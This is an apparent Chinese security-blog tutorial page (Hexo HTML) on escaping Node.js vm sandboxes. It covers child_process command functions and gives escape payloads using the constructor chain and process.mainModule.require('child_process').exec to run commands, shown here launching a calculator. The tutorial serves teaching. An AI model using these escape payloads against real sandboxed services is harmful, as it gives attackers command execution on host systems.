@@ -1,0 +1,644 @@
+<!DOCTYPE html>
+<html 
+	lang="en">
+	<head>
+		<meta charset="UTF-8" />
+		<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+		<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+		
+<link rel="stylesheet" href="/css/layout.css">
+
+		
+		<title> vm2沙箱逃逸 -  clown</title>
+		<link rel="stylesheet" href="https://unpkg.com/mdui@1.0.2/dist/css/mdui.min.css" />
+		<script src="https://unpkg.com/mdui@1.0.2/dist/js/mdui.min.js"></script>
+		<!-- lazyload -->
+		<script src="https://unpkg.com/lazysizes@5.1.0/lazysizes.min.js"></script>
+		<!-- smooth-scrolling -->
+		<script src="https://unpkg.com/smooth-scrolling.js@1.0.0"></script>
+		<!-- highlight -->
+		<link rel="stylesheet" href="//unpkg.com/@highlightjs/cdn-assets@11.6.0/styles/atom-one-dark.min.css" />
+		<script src="//unpkg.com/@highlightjs/cdn-assets@11.6.0/highlight.min.js"></script>
+		<!-- 预置 kiraicon -->
+		
+<link rel="stylesheet" href="/lib/iconfont/iconfont.css">
+
+		
+		<link
+			rel="shortcut icon"
+			href="https://cdn.jsdelivr.net/gh/clowsman/image@main/8591fe993ff61c3b8ac9be3d6c12e7f.jpg"
+			type="image/png"
+		/>
+		
+<link rel="stylesheet" href="/deps/css/APlayer.min.css">
+
+		
+			
+				
+<link rel="stylesheet" href="/style.css">
+
+			
+				
+<link rel="stylesheet" href="/custom.css">
+
+			
+		
+		
+<script src="/deps/js/APlayer.min.js"></script>
+<script src="/deps/js/Meting.min.js"></script>
+
+	<meta name="generator" content="Hexo 7.0.0"></head>
+
+	<body>
+		<div
+			class="kira-background"
+			style="background-image: url('https://cdn.jsdelivr.net/gh/clowsman/image@1.0/back.png')"
+		></div>
+		<div class="kira-header">
+    <a
+        class="kira-drawer-button mdui-ripple"
+        title="导航栏"
+        onclick="document.querySelector('.kira-sidebar-modal').classList.add('show');document.querySelector('.kira-sidebar#sidebar').classList.add('show');"
+    >
+        <i class="kirafont icon-menu"></i>
+    </a>
+    <a href="/" title="clown">
+        <img
+			src="https://cdn.jsdelivr.net/gh/clowsman/image@main/8591fe993ff61c3b8ac9be3d6c12e7f.jpg"
+			alt="clown"
+		/>
+    </a>
+</div>
+		<div class="kira-body">
+			<div class="kira-sidebar" id="sidebar">
+	<div class="kira-avatar mdui-ripple">
+		<a target="_blank" rel="noopener" href="https://cdn.jsdelivr.net/gh/clowsman/image@main/8591fe993ff61c3b8ac9be3d6c12e7f.jpg" title="clown">
+			<img
+				src="https://cdn.jsdelivr.net/gh/clowsman/image@main/8591fe993ff61c3b8ac9be3d6c12e7f.jpg"
+				alt="clown"
+			/>
+		</a>
+	</div>
+	<div class="kira-count">
+		<div><span>文章</span>17</div>
+		<div><span>标签</span>9</div>
+		<div><span>分类</span>9</div>
+	</div>
+	<div class="kira-list">
+		
+		<a
+			class="kira-list-item mdui-ripple false"
+			href="/"
+			title="回到首页"
+		>
+			<i
+				class="kirafont
+					
+						icon-home
+					"
+			></i>
+			<div class="kira-list-item-content">
+				回到首页
+			</div>
+		</a>
+		
+		<a
+			class="kira-list-item mdui-ripple false"
+			href="/archive.html"
+			title="文章归档"
+		>
+			<i
+				class="kirafont
+					
+						icon-container
+					"
+			></i>
+			<div class="kira-list-item-content">
+				文章归档
+			</div>
+		</a>
+		
+		<a
+			class="kira-list-item mdui-ripple false"
+			href="/about.html"
+			title="关于本人"
+		>
+			<i
+				class="kirafont
+					
+						icon-user
+					"
+			></i>
+			<div class="kira-list-item-content">
+				关于本人
+			</div>
+		</a>
+		
+		<a
+			class="kira-list-item mdui-ripple false"
+			href="/friends.html"
+			title="我的朋友"
+		>
+			<i
+				class="kirafont
+					
+						icon-team
+					"
+			></i>
+			<div class="kira-list-item-content">
+				我的朋友
+			</div>
+		</a>
+		
+	</div>
+	<aside id="kira-sidebar">
+		
+			<div class="kira-widget-wrap">
+	<div class="kira-widget kira-social">
+		
+			<a
+				class="mdui-ripple"
+				href="tencent://AddContact/?fromId=45&fromSubId=1&subcmd=all&uin=1056317718&website=www.oicqzone.com"
+				target="_blank"
+				mdui-tooltip="{content: 'QQ'}"
+				style="color: rgb(49, 174, 255); background-color: rgba(49, 174, 255, .1);"
+			>
+				<i
+					class="kirafont
+					
+						icon-QQ
+					"
+				></i>
+			</a>
+		
+			<a
+				class="mdui-ripple"
+				href="https://space.bilibili.com/378722283"
+				target="_blank"
+				mdui-tooltip="{content: '哔哩哔哩'}"
+				style="color: rgb(231, 106, 141); background-color: rgba(231, 106, 141, .15);"
+			>
+				<i
+					class="kirafont
+					
+						icon-bilibili
+					"
+				></i>
+			</a>
+		
+			<a
+				class="mdui-ripple"
+				href="https://github.com/clowsman"
+				target="_blank"
+				mdui-tooltip="{content: 'GitHub'}"
+				style="color: rgb(25, 23, 23); background-color: rgba(25, 23, 23, .15);"
+			>
+				<i
+					class="kirafont
+					
+						icon-github
+					"
+				></i>
+			</a>
+		
+			<a
+				class="mdui-ripple"
+				href="https://gitee.com/ljc0033"
+				target="_blank"
+				mdui-tooltip="{content: 'Gitee'}"
+				style="color: rgb(165, 15, 15); background-color: rgba(165, 15, 15, .15);"
+			>
+				<i
+					class="kirafont
+					
+						icon-gitee
+					"
+				></i>
+			</a>
+		
+	</div>
+</div>
+
+		
+			
+  <div class="kira-widget-wrap">
+    <h3 class="kira-widget-title">分类</h3>
+    <div class="kira-widget">
+      <ul class="category-list">
+        
+        
+
+        
+          <li class="category-list-item">
+            <a class="category-list-link" href="/categories/blog/">
+              blog
+            </a>
+            <span class="category-list-count">2</span>
+          </li>
+        
+          <li class="category-list-item">
+            <a class="category-list-link" href="/categories/ctf-web/">
+              ctf web
+            </a>
+            <span class="category-list-count">1</span>
+          </li>
+        
+          <li class="category-list-item">
+            <a class="category-list-link" href="/categories/git/">
+              git
+            </a>
+            <span class="category-list-count">1</span>
+          </li>
+        
+          <li class="category-list-item">
+            <a class="category-list-link" href="/categories/go/">
+              go
+            </a>
+            <span class="category-list-count">1</span>
+          </li>
+        
+          <li class="category-list-item">
+            <a class="category-list-link" href="/categories/web/">
+              web
+            </a>
+            <span class="category-list-count">2</span>
+          </li>
+        
+          <li class="category-list-item">
+            <a class="category-list-link" href="/categories/区块链/">
+              区块链
+            </a>
+            <span class="category-list-count">1</span>
+          </li>
+        
+          <li class="category-list-item">
+            <a class="category-list-link" href="/categories/基础/">
+              基础
+            </a>
+            <span class="category-list-count">4</span>
+          </li>
+        
+          <li class="category-list-item">
+            <a class="category-list-link" href="/categories/提权/">
+              提权
+            </a>
+            <span class="category-list-count">1</span>
+          </li>
+        
+          <li class="category-list-item">
+            <a class="category-list-link" href="/categories/环境配置/">
+              环境配置
+            </a>
+            <span class="category-list-count">1</span>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+		
+			
+	<div class="kira-widget-wrap">
+		<div id="randomtagcloud" class="kira-widget tagcloud kira-rainbow">
+			<a href="/tags/CTF-BC/" style="font-size: 10px;">CTF BC</a> <a href="/tags/c-c-%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/" style="font-size: 10px;">c/c++ 环境配置</a> <a href="/tags/ctf/" style="font-size: 10px;">ctf</a> <a href="/tags/ctf-%E5%88%B7%E9%A2%98/" style="font-size: 10px;">ctf 刷题</a> <a href="/tags/go/" style="font-size: 10px;">go</a> <a href="/tags/web/" style="font-size: 10px;">web</a> <a href="/tags/web-ctf-nodejs/" style="font-size: 10px;">web ctf nodejs</a> <a href="/tags/%E5%AD%A6%E4%B9%A0/" style="font-size: 15px;">学习</a> <a href="/tags/%E8%AE%A1%E7%BD%91/" style="font-size: 20px;">计网</a>
+		</div>
+		
+	</div>
+
+
+		
+	</aside>
+	<div class="kira-copyright">
+		&copy; 2024
+		<a href="/">clown</a>
+		Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> &
+		<a href="https://github.com/ch1ny/kira-hexo/" target="_blank">Kira-Hexo</a>
+		<br />
+		
+		
+	</div>
+</div>
+<div
+	class="kira-sidebar-modal"
+	id="sidebar-modal"
+	onclick="(function(self) {
+		self.classList.remove('show');
+		document.querySelector('.kira-sidebar.show#sidebar').classList.remove('show');
+	})(this)"
+></div>
+			<div class="kira-content">
+				<div id="kira-top-header"></div>
+				<div class="kira-main-content">
+					
+<link rel="stylesheet" href="/css/kira-image.css">
+
+
+<script src="/js/kira-image.js"></script>
+
+<div class="kira-image">
+    <div class="kira-image-modal">
+        <div class="kira-image-header">
+            <div class="kira-image-counter"></div>
+            <div class="kira-image-title"></div>
+            <div class="kira-image-operation">
+                <div class="kira-image-operation-button" id="kira-image-operation-button-zoom">
+                    <i class="kirafont icon-zoom-in"></i>
+                </div>
+                <div class="kira-image-operation-button" id="kira-image-operation-button-close">
+                    <i class="kirafont icon-close"></i>
+                </div>
+            </div>
+        </div>
+        <div class="kira-image-container">
+            <div class="kira-image-prev-button-panel">
+                <div class="kira-image-exchange-button">
+                    <i class="kirafont icon-left"></i>
+                </div>
+            </div>
+            <div class="kira-image-list">
+                <div class="kira-image-prev">
+                    <img />
+                </div>
+                <div class="kira-image-now">
+                    <img />
+                </div>
+                <div class="kira-image-next">
+                    <img />
+                </div>
+            </div>
+            <div class="kira-image-next-button-panel">
+                <div class="kira-image-exchange-button">
+                    <i class="kirafont icon-right"></i>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+<div class="kira-post">
+	<article>
+		
+		<div
+			class="kira-post-cover"
+			style="padding-bottom: '56.25%'"
+		>
+			<img
+				data-src="https://cdn.jsdelivr.net/gh/clowsman/image@1.0/back.png"
+				data-sizes="auto"
+				alt="vm2沙箱逃逸"
+				class="lazyload kira-post-cover-image disabled-kira-image"
+			/>
+			<h1>vm2沙箱逃逸</h1>
+		</div>
+		
+		<div class="kira-post-meta kira-rainbow" style="margin:10px 0!important;">
+			<a><i class="kirafont icon-calendar-fill"></i>2024年03月09日</a>
+			<a><i class="kirafont icon-edit-fill"></i>3.1k 字</a>
+			<a><i class="kirafont icon-time-circle-fill"></i>大概 14 分钟</a>
+		</div>
+		<h1><span id="sha-xiang-tao-yi-de-gai-nian">沙箱逃逸的概念</span><a href="#sha-xiang-tao-yi-de-gai-nian" class="header-anchor">#</a></h1><ul>
+<li>沙箱(sandbox)就是创建一个单独的运行代码的环境，和主机进行隔离，这样代码产生的危害就不会影响到主机，沙箱的工作机制主要是依靠重定向，将恶意代码的执行目标重定向到沙箱内部。</li>
+<li>沙箱（sandbox）和 虚拟机（VM）和 容器（Docker）之间的区别：sandbox和VM使用的都是虚拟化技术，但二者间使用的目的不一样。沙箱用来隔离有害程序，而虚拟机则实现了我们在一台电脑上使用多个操作系统的功能。Docker属于sandbox的一种，通过创造一个有边界的运行环境将程序放在里面，使程序被边界困住，从而使程序与程序，程序与主机之间相互隔离开。在实际防护时，使用Docker和sandbox嵌套的方式更多一点，安全性也更高。</li>
+<li>Nodejs中，通过vm模块来创建一个沙箱，但vm模块的漏洞较大，后续就出现了升级版的vm2，对vm做了优化，但是在旧版本仍然存在一些漏洞。</li>
+</ul>
+<p>那么沙箱逃逸就是字面意思，逃离该沙箱环境对主机进行影响，比如rce等。</p>
+<h1><span id="nodejs-ming-ling-zhi-xing">Nodejs命令执行</span><a href="#nodejs-ming-ling-zhi-xing" class="header-anchor">#</a></h1><p>要进行rce就要先了解一下Nodejs的执行命令的一些模块和函数。</p>
+<p>参考文章：<a target="_blank" rel="noopener" href="https://www.w3cschool.cn/nwfchn/omcvtozt.html">https://www.w3cschool.cn/nwfchn/omcvtozt.html</a></p>
+<ul>
+<li><p>eval()：这个函数跟php的效果一样，也是直接将字符串当作代码执行。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;console.log(&quot;hello&quot;)&#x27;</span>);<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>child_process模块：该模块就是nodejs用来执行命令的模块</p>
+<ul>
+<li><p>exec()：该方法用来执行bash命令</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> exec=<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).<span class="hljs-property">exec</span>;<br><span class="hljs-keyword">var</span> whoami=<span class="hljs-title function_">exec</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params">error, stdout, stderr</span>)&#123;<br>    <span class="hljs-keyword">if</span>(error)&#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(error.<span class="hljs-property">stack</span>);<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Error code: &#x27;</span>+error.<span class="hljs-property">code</span>);<br>    &#125;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Child Process STDOUT: &#x27;</span>+stdout);<br>&#125;);<br><span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;console.log(&quot;hello&quot;)&#x27;</span>);<br></code></pre></td></tr></table></figure>
+
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240309144449923.png" alt="image-20240309144449923" class="lazyload"></p>
+<p>exec方法的第一个参数是所要执行的shell命令，第二个参数是回调函数，该函数接受三个参数，分别是发生的错误、标准输出的显示结果、标准错误的显示结果。</p>
+</li>
+<li><p>execFile()：该方法直接执行特定的程序，参数作为数组传入，不会被bash解释，因此具有较高的安全性。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> execFile=<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).<span class="hljs-property">execFile</span>;<br><span class="hljs-title function_">execFile</span>(<span class="hljs-string">&#x27;/bin/ls&#x27;</span>,[<span class="hljs-string">&#x27;-l&#x27;</span>,<span class="hljs-string">&#x27;.&#x27;</span>],<span class="hljs-keyword">function</span>(<span class="hljs-params">error,result</span>)&#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(result);<br>&#125;)<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>spawn()：spawn方法创建一个子进程来执行特定命令，用法与execFile方法类似，但是没有回调函数，只能通过监听事件，来获取运行结果。它属于异步执行，适用于子进程长时间运行的情况。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JS"><span class="hljs-keyword">var</span> spawn=<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).<span class="hljs-property">spawn</span>;<br><span class="hljs-keyword">var</span> who=<span class="hljs-title function_">spawn</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>);<br>who.<span class="hljs-property">stdout</span>.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;data&#x27;</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>)&#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;stdout: &#x27;</span>+data);<br>&#125;);<br>who.<span class="hljs-property">stderr</span>.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;data&#x27;</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>)&#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;stderr: &#x27;</span>+data)<br>&#125;);<br>who.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;close&#x27;</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params">code</span>)&#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;closing code: &#x27;</span>+code);<br>&#125;);<br></code></pre></td></tr></table></figure>
+
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240309145912479.png" alt="image-20240309145912479" class="lazyload"></p>
+<p>spawn方法接受两个参数，第一个是可执行文件，第二个是参数数组。</p>
+<p>spawn对象返回一个对象，代表子进程。该对象部署了EventEmitter接口，它的data事件可以监听，从而得到子进程的输出结果。</p>
+<p>spawn方法与exec方法非常类似，只是使用格式略有区别。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js">child_process.<span class="hljs-title function_">exec</span>(command, [options], callback)<br>child_process.<span class="hljs-title function_">spawn</span>(command, [args], [options])<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>fork()：fork方法直接创建一个子进程，执行Node脚本，<code>fork(&#39;./child.js&#39;)</code> 相当于 <code>spawn(&#39;node&#39;, [&#39;./child.js&#39;])</code> 。与spawn方法不同的是，fork会在父进程与子进程之间，建立一个通信管道，用于进程之间的通信。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> n = child_process.<span class="hljs-title function_">fork</span>(<span class="hljs-string">&#x27;./child.js&#x27;</span>);<br>n.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;message&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">m</span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;PARENT got message:&#x27;</span>, m);<br>&#125;);<br>n.<span class="hljs-title function_">send</span>(&#123; <span class="hljs-attr">hello</span>: <span class="hljs-string">&#x27;world&#x27;</span> &#125;);<br></code></pre></td></tr></table></figure>
+
+<p>上面代码中，fork方法返回一个代表进程间通信管道的对象，对该对象可以监听message事件，用来获取子进程返回的信息，也可以向子进程发送信息。</p>
+<p>child.js脚本的内容如下。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js">process.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;message&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">m</span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;CHILD got message:&#x27;</span>, m);<br>&#125;);<br>process.<span class="hljs-title function_">send</span>(&#123; <span class="hljs-attr">foo</span>: <span class="hljs-string">&#x27;bar&#x27;</span> &#125;);<br></code></pre></td></tr></table></figure>
+
+<p>上面代码中，子进程监听message事件，并向父进程发送信息。</p>
+</li>
+<li><p>send()：使用 child_process.fork() 生成新进程之后，就可以用 child.send(message, [sendHandle]) 向新进程发送消息。新进程中通过监听message事件，来获取消息。也就是上面fork示例的代码。</p>
+</li>
+</ul>
+</li>
+</ul>
+<h1><span id="vm-sha-xiang-tao-yi">vm沙箱逃逸</span><a href="#vm-sha-xiang-tao-yi" class="header-anchor">#</a></h1><p>参考文章：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/13427?time__1311=mqmxnDBQqeu4lxGg2DyeHDkQdexWwhD&alichlgref=https://www.google.com/">NodeJs vm沙箱逃逸 - 先知社区 (aliyun.com)</a></p>
+<h2><span id="vm-mo-kuai-de-shi-yong">vm模块的使用</span><a href="#vm-mo-kuai-de-shi-yong" class="header-anchor">#</a></h2><ul>
+<li><strong>vm.createContext([contextObject[, options]])</strong></li>
+</ul>
+<p>该模块在使用前需要先创建一个沙箱对象，再将沙箱对象传给该方法（如果没有则会生成一个空的沙箱对象），v8引擎为这个沙箱对象在当前global外再创建一个作用域，此时这个沙箱对象就是这个作用域的全局对象，沙箱内部无法访问global中的属性。</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240309153446420.png" alt="image-20240309153446420" class="lazyload"></p>
+<ul>
+<li><p>**vm.runInContext(code, contextifiedSandbox[, options])**：该函数参数为要执行的代码和创建完作用域的沙箱对象，代码会在传入的沙箱对象的上下文中执行，并且参数的值与沙箱内的参数值相同。</p>
+<p>runInContext需要配合createContext创建的沙箱来进行运行</p>
+</li>
+<li><p>所以这两个模块方法配合起来使用如下：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> vm=<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;vm&#x27;</span>);<br><span class="hljs-variable language_">global</span>.<span class="hljs-property">globalVar</span>=<span class="hljs-number">5</span>;<br><span class="hljs-keyword">const</span> sandbox=&#123;<span class="hljs-attr">globalVar</span>:<span class="hljs-number">10</span>&#125;;<br>vm.<span class="hljs-title function_">createContext</span>(sandbox);<br>vm.<span class="hljs-title function_">runInContext</span>(<span class="hljs-string">&#x27;globalVar*=2;console.log(globalVar);&#x27;</span>,sandbox);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(globalVar);<br></code></pre></td></tr></table></figure>
+
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240309154253819.png" alt="image-20240309154253819" class="lazyload"></p>
+</li>
+<li><p><strong>vm.runInThisContext(code[, options])</strong></p>
+</li>
+</ul>
+<p>在当前global下创建一个作用域（sandbox），并将接收到的参数当作代码运行。</p>
+<p>这里需要注意的就是runInThisContext虽然是会创建相关的沙箱环境，可以访问到global上的全局变量，但是访问不到自定义的变量。</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240309154545749.png" alt="image-20240309154545749" class="lazyload"></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> vm=<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;vm&#x27;</span>);<br><span class="hljs-variable language_">global</span>.<span class="hljs-property">globalVar</span>=<span class="hljs-number">5</span>;<br><span class="hljs-keyword">var</span> <span class="hljs-title class_">Var</span>=<span class="hljs-number">123</span>;<br>vm.<span class="hljs-title function_">runInThisContext</span>(<span class="hljs-string">&#x27;console.log(globalVar);&#x27;</span>);<br>vm.<span class="hljs-title function_">runInThisContext</span>(<span class="hljs-string">&#x27;console.log(Var);&#x27;</span>);<br></code></pre></td></tr></table></figure>
+
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240309154838701.png" alt="image-20240309154838701" class="lazyload"></p>
+<blockquote>
+<p>可知可以访问全局变量，但自定义的不能访问，会报错。</p>
+</blockquote>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;vm&#x27;</span>);<br><span class="hljs-keyword">let</span> localVar = <span class="hljs-string">&#x27;initial value&#x27;</span>;<br><span class="hljs-keyword">const</span> vmResult = vm.<span class="hljs-title function_">runInThisContext</span>(<span class="hljs-string">&#x27;localVar = &quot;vm&quot;;&#x27;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;vmResult:&#x27;</span>, vmResult);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;localVar:&#x27;</span>, localVar);<br><span class="hljs-comment">// vmResult: &#x27;vm&#x27;, localVar: &#x27;initial value&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>vm.runInNewContext(code[, contextObject[, options]])</strong></li>
+</ul>
+<p>creatContext和runInContext的结合版，传入要执行的代码和沙箱对象，不提供的话默认生成一个沙箱来进行使用。</p>
+<blockquote>
+<p>提一嘴Nodejs中数据类型可以分为两大类：基本类型和对象类型</p>
+<p>基本类型包括以下六种：</p>
+<ul>
+<li>string：表示文本数据，用单引号或双引号包裹，如 ‘hello’ 或 “world”。</li>
+<li>number：表示数值数据，可以是整数或小数，如 42 或 3.14。</li>
+<li>boolean：表示逻辑数据，只有两个值，true 或 false。</li>
+<li>null：表示空值，表示一个对象没有引用任何值。</li>
+<li>undefined：表示未定义值，表示一个变量没有被赋值。</li>
+<li>symbol：表示唯一的标识符，用 Symbol() 函数创建，如 Symbol(‘foo’)。</li>
+</ul>
+<p>那么除了这些基本类型的就是对象类型了。</p>
+</blockquote>
+<h2><span id="li-yong-sha-xiang-lai-zhi-xing-ming-ling">利用沙箱来执行命令</span><a href="#li-yong-sha-xiang-lai-zhi-xing-ming-ling" class="header-anchor">#</a></h2><p>这里写一下不同沙箱执行命令的写法</p>
+<ul>
+<li><p><strong>runInThisContext</strong></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> vm=<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;vm&#x27;</span>);<br>vm.<span class="hljs-title function_">runInThisContext</span>(<span class="hljs-string">`process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;calc&#x27;)`</span>);<br></code></pre></td></tr></table></figure>
+
+<p>然后就能弹计算器了</p>
+<blockquote>
+<p>这里了解一下为什么要这么写</p>
+<ul>
+<li><p>process：</p>
+<p>process 对象是 Node.js 提供的一个全局变量，它包含了有关当前 Node.js 进程的信息和控制方法。</p>
+<p>process 对象可以直接使用，而不需要通过 require() 引入，是因为它是一个预定义的全局对象，类似于 console、global、Buffer 等。</p>
+<p>process 对象有很多有用的属性和方法，例如：</p>
+<ul>
+<li><p>process.env：可以获取或设置环境变量，如 process.env.NODE_ENV。</p>
+</li>
+<li><p>process.argv：可以获取命令行参数，如 process.argv[0]。</p>
+</li>
+<li><p>process.cwd()：可以获取当前工作目录，如 process.cwd()。</p>
+</li>
+<li><p>process.exit()：可以退出当前进程，如 process.exit(0)。</p>
+</li>
+<li><p>process.mainModule： 是 Node.js 提供的一个全局变量，它是一个对象，表示当前主模块的 Module 实例，主模块就是node执行的js。</p>
+<p>它可以让你获取当前主模块的一些信息，例如它的文件名、路径、子模块等，比如process.mainModule.require。</p>
+</li>
+</ul>
+</li>
+<li><p>因为沙箱中没有 require() 函数，这是 Node.js 的一个全局函数，用于加载模块，但它不是 global 对象上的一个属性，而是在每个模块的本地作用域中定义的。从上面的作用域可以知道，require就是在node执行的js内定义的函数，而沙箱内部就是另一个独立的模块，所以是没有require函数的，需要从process.mainModule中获取。</p>
+</li>
+</ul>
+</blockquote>
+</li>
+<li><p><strong>vm.runInContext(code, contextifiedSandbox[, options])</strong></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> vm=<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;vm&#x27;</span>);<br><span class="hljs-keyword">const</span> sandbox=&#123;<span class="hljs-attr">x</span>:<span class="hljs-number">2</span>&#125;;<br>vm.<span class="hljs-title function_">createContext</span>(sandbox);<br><span class="hljs-keyword">const</span> code=<span class="hljs-string">&#x27;this.toString.constructor(&quot;return process&quot;)();&#x27;</span>;<br><span class="hljs-comment">//vm.runInNewContext(`this.constructor.constructor(&#x27;return process&#x27;)()`);这样获取process对象也是可以的</span><br><span class="hljs-keyword">const</span> res=vm.<span class="hljs-title function_">runInContext</span>(code,sandbox);<br>res.<span class="hljs-property">mainModule</span>.<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).<span class="hljs-title function_">exec</span>(<span class="hljs-string">&#x27;calc&#x27;</span>);<br></code></pre></td></tr></table></figure>
+
+<p>因为该方法的作用域是独立于global的，所以我们需要先获取global的process对象，然后就可以执行命令了。</p>
+<blockquote>
+<p>解释一下是怎么获取process对象的：</p>
+<p>在沙箱中this指向的是沙箱对象sandbox，这个对象是不属于沙箱环境的，我们通过这个对象获取到它的构造器，再获得一个构造器对象的构造器（此时为Function的constructor），最后的<code>()</code>是调用这个用Function的constructor生成的函数，最终返回了一个process对象。</p>
+<p>这是一个构造器链的图例：</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240309170145802.png" alt="image-20240309170145802" class="lazyload"></p>
